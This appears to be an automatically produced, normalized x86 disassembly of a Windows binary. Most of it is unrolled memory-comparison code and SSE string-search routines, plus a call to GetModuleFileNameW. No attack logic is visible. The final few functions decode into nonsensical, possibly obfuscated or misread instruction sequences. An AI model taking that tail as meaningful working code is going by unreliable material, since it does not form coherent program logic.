xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1b ]
movzx eax [ ecx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x17 ]
movzx eax [ ecx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x13 ]
movzx eax [ ecx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xf ]
movzx eax [ ecx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xb ]
movzx eax [ ecx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x7 ]
movzx eax [ ecx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x3 ]
movzx eax [ ecx - 0x3 ]
sub esi eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1c ]
movzx eax [ ecx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x18 ]
movzx eax [ ecx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x14 ]
movzx eax [ ecx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x10 ]
movzx eax [ ecx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xc ]
movzx eax [ ecx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x8 ]
movzx eax [ ecx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x4 ]
movzx eax [ ecx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
test ebx ebx
setg al
lea ebx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx esi [ edx - 0x1d ]
movzx eax [ ecx - 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x19 ]
movzx eax [ ecx - 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x15 ]
movzx eax [ ecx - 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x11 ]
movzx eax [ ecx - 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xd ]
movzx eax [ ecx - 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x9 ]
movzx eax [ ecx - 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x5 ]
movzx eax [ ecx - 0x5 ]
sub esi eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
jmp r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx + 0x8 ]
sub esi eax
je r-xdata
movzx esi [ edx + 0x6 ]
movzx eax [ ecx + 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
movzx esi [ edx - 0x19 ]
movzx eax [ ecx - 0x19 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x15 ]
movzx eax [ ecx - 0x15 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x11 ]
movzx eax [ ecx - 0x11 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xd ]
movzx eax [ ecx - 0xd ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x9 ]
movzx eax [ ecx - 0x9 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x5 ]
movzx eax [ ecx - 0x5 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx ebx [ edx - 0x1 ]
movzx eax [ ecx - 0x1 ]
sub ebx eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1a ]
movzx eax [ ecx - 0x1a ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x16 ]
movzx eax [ ecx - 0x16 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x12 ]
movzx eax [ ecx - 0x12 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xe ]
movzx eax [ ecx - 0xe ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xa ]
movzx eax [ ecx - 0xa ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x6 ]
movzx eax [ ecx - 0x6 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx ebx [ edx - 0x2 ]
movzx eax [ ecx - 0x2 ]
sub ebx eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
movzx esi [ edx - 0x1b ]
movzx eax [ ecx - 0x1b ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x17 ]
movzx eax [ ecx - 0x17 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x13 ]
movzx eax [ ecx - 0x13 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xf ]
movzx eax [ ecx - 0xf ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xb ]
movzx eax [ ecx - 0xb ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x7 ]
movzx eax [ ecx - 0x7 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x3 ]
movzx eax [ ecx - 0x3 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x1c ]
movzx eax [ ecx - 0x1c ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x18 ]
movzx eax [ ecx - 0x18 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x14 ]
movzx eax [ ecx - 0x14 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x10 ]
movzx eax [ ecx - 0x10 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0xc ]
movzx eax [ ecx - 0xc ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx - 0x8 ]
movzx eax [ ecx - 0x8 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx ebx [ edx - 0x4 ]
movzx eax [ ecx - 0x4 ]
sub ebx eax
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx * 2 - 0x1 ]
test ebx ebx
jne r-xdata
mov eax [ edx + 0xc ]
cmp eax [ ecx + 0xc ]
je r-xdata
movzx esi [ edx + 0x9 ]
movzx eax [ ecx + 0x9 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0x7 ]
movzx eax [ ecx + 0x7 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ebx ebx
setg al
lea ebx [ eax * 2 - 0x1 ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ebx ebx
setg al
lea ebx [ eax * 2 - 0x1 ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ebx ebx
setg al
lea ebx [ eax * 2 - 0x1 ]
mov eax ebx
movzx esi al
movzx eax [ ecx + 0xc ]
sub esi eax
je r-xdata
movzx esi [ edx + 0xa ]
movzx eax [ ecx + 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax [ edx + 0x10 ]
cmp eax [ ecx + 0x10 ]
je r-xdata
movzx esi [ edx + 0xd ]
movzx eax [ ecx + 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0xb ]
movzx eax [ ecx + 0xb ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx + 0x10 ]
sub esi eax
je r-xdata
movzx esi [ edx + 0xe ]
movzx eax [ ecx + 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ edx + 0x14 ]
cmp eax [ ecx + 0x14 ]
je r-xdata
movzx esi [ edx + 0x11 ]
movzx eax [ ecx + 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0xf ]
movzx eax [ ecx + 0xf ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx + 0x14 ]
sub esi eax
je r-xdata
movzx esi [ edx + 0x12 ]
movzx eax [ ecx + 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ edx + 0x18 ]
cmp eax [ ecx + 0x18 ]
je r-xdata
movzx esi [ edx + 0x15 ]
movzx eax [ ecx + 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0x13 ]
movzx eax [ ecx + 0x13 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx + 0x18 ]
sub esi eax
je r-xdata
movzx esi [ edx + 0x16 ]
movzx eax [ ecx + 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ edx + 0x1c ]
cmp eax [ ecx + 0x1c ]
je r-xdata
movzx esi [ edx + 0x19 ]
movzx eax [ ecx + 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0x17 ]
movzx eax [ ecx + 0x17 ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax ebx
movzx esi al
movzx eax [ ecx + 0x1c ]
sub esi eax
je r-xdata
movzx esi [ edx + 0x1a ]
movzx eax [ ecx + 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
push 0x20
pop esi
sub edi esi
add edx esi
add ecx esi
cmp edi esi
jae r-xdata
movzx esi [ edx + 0x1d ]
movzx eax [ ecx + 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ edx + 0x1b ]
movzx eax [ ecx + 0x1b ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
movzx esi [ edx + 0x1e ]
movzx eax [ ecx + 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
movzx esi [ edx + 0x1f ]
movzx eax [ ecx + 0x1f ]
sub esi eax
mov [ ebp - 0x4 ] esi
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
jmp r-xdata
test eax eax
jne r-xdata
sub_44cab0
push ebp
mov ebp esp
push edi
cmp [ rw-data ] 0x1
jb r-xdata
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov edi [ ebp + 0x8 ]
ja r-xdata
mov eax edi
xor eax eax
jmp r-xdata
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
movzx edx [ ebp + 0xc ]
mov eax edx
shl edx 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov ecx 0xf
and ecx edi
or eax 0xffffffff
shl eax cl
sub edi ecx
xor edx edx
cld
pop edi
leave
retn
mov eax 0xfffffff0
and eax edi
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax ]
mov ecx 0xf
and ecx edi
mov edx 0xffffffff
shl edx cl
pmovmskb edi xmm0
and edi edx
jne r-xdata
xor eax eax
test edi 0xf
je r-xdata
push ebx
pmovmskb ebx xmm1
and ebx eax
shl ecx 0x1
xor eax eax
sub eax ecx
and ecx eax
dec ecx
and ecx ebx
pop ebx
bsr eax ecx
add eax edi
test ecx ecx
cmove eax edx
pop edi
leave
retn
pmovmskb ecx xmm1
and ecx eax
bsr eax ecx
add eax edi
test ecx ecx
cmovne edx eax
or eax 0xffffffff
add edi 0x10
jmp r-xdata
bsf edx edi
add eax edx
jmp r-xdata
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax + 0x10 ]
add eax 0x10
pmovmskb edi xmm0
test edi edi
je r-xdata
movd xmm0 edx
movzx ecx [ edi ]
cmp ecx edx
cmove eax edi
test ecx ecx
je r-xdata
movdqu xmm1 [ edi ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
pop edi
leave
retn
add edi 0x10
pcmpistri xmm0 [ edi - 0x10 ] 0x40
lea ecx [ edi + ecx - 0x10 ]
cmovb eax ecx
jne r-xdata
inc edi
test edi 0xf
jne r-xdata
sub_44cbf0
cmp [ rw-data ] 0x1
jb r-xdata
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
movzx eax [ esp + 0x8 ]
mov edx eax
shl eax 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov edx [ esp + 0x4 ]
mov ecx 0xf
or eax 0xffffffff
and ecx edx
shl eax cl
sub edx ecx
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
bsf eax ecx
add eax edx
movd edx xmm3
xor ecx ecx
cmp dl [ eax ]
cmovne eax ecx
retn
or eax 0xffffffff
add edx 0x10
jmp r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
movdqu xmm1 [ edx ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
por xmm2 xmm1
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_44cd1b
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
mov ecx [ ebx + 0x8 ]
sub esp 0x20
cmp [ rw-data ] 0x1
mov dx [ ebx + 0xc ]
jl r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
movzx eax dx
movd xmm0 eax
pshuflw xmm0 xmm0 0x0
pshufd xmm2 xmm0 0x0
cmp ax dx
je r-xdata
xor eax eax
cmp [ ecx ] dx
setne al
dec eax
and eax ecx
jmp r-xdata
movzx eax [ ecx ]
cmp ax dx
je r-xdata
movups xmm0 [ ecx ]
pxor xmm1 xmm1
pcmpeqw xmm1 xmm0
pcmpeqw xmm0 xmm2
por xmm1 xmm0
pmovmskb eax xmm1
test eax eax
jne r-xdata
add ecx 0x2
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
mov eax ecx
test ax ax
je r-xdata
bsf eax eax
mov [ ebp - 0x4 ] eax
add ecx eax
jmp r-xdata
add ecx 0x10
jmp r-xdata
xor eax eax
jmp r-xdata
add ecx 0x2
jmp r-xdata
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
sub_401290
push esi
mov esi ecx
push 0x7dc
push 0x0
lea eax [ esi + 0x4 ]
mov [ esi ] 0x0
push eax
call sub_40de60
add esp 0xc
mov eax esi
pop esi
retn
sub_4012b0
retn
sub_4012c0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
push [ ecx ]
mov [ rw-data ] 0x1
push [ ebp + 0x8 ]
call sub_401400
mov eax 0x1
pop ebp
retn 0xc
sub_4015e0
retn
sub_4015f0
mov [ ecx + 0x108 ] 0x1
mov eax ecx
mov [ ecx + 0x10c ] 0x1
retn
sub_401610
retn
sub_4019d0
mov eax rw-data
retn
sub_401a80
retn
sub_401b00
push esi
mov esi ecx
push 0x104
lea eax [ esi + 0x14 ]
mov [ esi + 0xc00 ] 0x0
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
mov eax esi
pop esi
retn
sub_401b30
retn
sub_401f0f
push ebx
push esp
push eax
push esp
push edx
call sub_40201b
jae 0xffffffffccc32e77
add [ eax ] al
add [ ecx - 0x7edb8a1d ] al
iretd
sub_402589
add esp 0x80
retn
sub_4027e3
push ebp
pushfd
push edi
pushfd
call sub_4027c0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
sub_402840
ja r-xdata
pop eax
pop edx
add esp 0x4
jae r-xdata
xor edx 0xd1e8509c
sub esp 0x18
call sub_402711
add edx 0x79810f59
add eax 0xff0e830f
sub_4029c0
push ebx
sub esp 0x14
call sub_4029ce
mov ecx 0xc281e579
sub [ esp + 0x64 ] r-xdata
